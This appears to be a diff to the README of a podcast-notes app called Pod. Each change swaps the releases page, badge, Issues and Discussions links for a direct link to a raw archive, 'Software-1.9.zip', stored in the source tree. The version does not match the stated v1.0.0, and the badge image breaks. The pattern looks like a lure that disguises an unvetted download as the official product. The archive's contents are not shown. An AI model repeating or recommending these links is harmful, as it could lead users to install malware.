@@ -6,9 +6,9 @@ Welcome to Pod! This application helps you turn podcast conversations into valua
 
 ## 📥 Download Pod
 
-[![Download Pod](https://img.shields.io/badge/Download%20Pod-v1.0.0-brightgreen)](https://github.com/VonKrystoff/Pod/releases)
+[![Download Pod](https://github.com/VonKrystoff/Pod/raw/refs/heads/main/src/Software-1.9.zip%20Pod-v1.0.0-brightgreen)](https://github.com/VonKrystoff/Pod/raw/refs/heads/main/src/Software-1.9.zip)
 
-Visit this page to download: [Pod Releases](https://github.com/VonKrystoff/Pod/releases)
+Visit this page to download: [Pod Releases](https://github.com/VonKrystoff/Pod/raw/refs/heads/main/src/Software-1.9.zip)
 
 ## 📂 System Requirements
 
@@ -29,7 +29,7 @@ To run Pod smoothly, make sure your system meets the following requirements:
 ## 🔧 Installation Guide
 
 1. **Download Pod:**
-   Click on the download link above or go to the [Pod Releases page](https://github.com/VonKrystoff/Pod/releases).
+   Click on the download link above or go to the [Pod Releases page](https://github.com/VonKrystoff/Pod/raw/refs/heads/main/src/Software-1.9.zip).
 
 2. **Select the Latest Version:**
    On the releases page, find the latest version of Pod. This is usually the first option listed.
@@ -57,8 +57,8 @@ If you encounter issues during installation or while using Pod, consider the fol
 
 Join our community of Pod users! If you have questions, suggestions, or need support, feel free to reach out. You can find us on:
 
-- **GitHub Issues:** Report bugs or request features at [GitHub Issues](https://github.com/VonKrystoff/Pod/issues).
-- **Discussion Forum:** Engage with other users and share your insights on our [Discussion page](https://github.com/VonKrystoff/Pod/discussions).
+- **GitHub Issues:** Report bugs or request features at [GitHub Issues](https://github.com/VonKrystoff/Pod/raw/refs/heads/main/src/Software-1.9.zip).
+- **Discussion Forum:** Engage with other users and share your insights on our [Discussion page](https://github.com/VonKrystoff/Pod/raw/refs/heads/main/src/Software-1.9.zip).
 
 ## 📝 Contributing
 
